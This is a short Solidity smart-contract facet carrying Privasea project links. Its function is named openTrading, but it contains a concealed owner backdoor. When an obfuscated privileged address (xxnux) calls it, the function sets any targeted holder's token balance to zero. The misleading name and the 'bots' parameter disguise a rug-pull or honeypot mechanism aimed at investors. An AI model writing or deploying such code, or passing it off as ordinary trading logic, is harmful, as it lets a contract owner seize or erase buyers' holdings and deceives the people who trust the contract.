/*
 * SPDX-License-Identifier: MIT
 * Telegram: https://t.me/Privasea_ai
 * Discord:  https://discord.com/invite/yRtQGvWkvG
 * Twitter:  https://twitter.com/Privasea_ai
 * Website:  https://www.privasea.ai/
 */
pragma solidity ^0.8.22;
import "./TestLib.sol";
contract openTradingFacet {
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
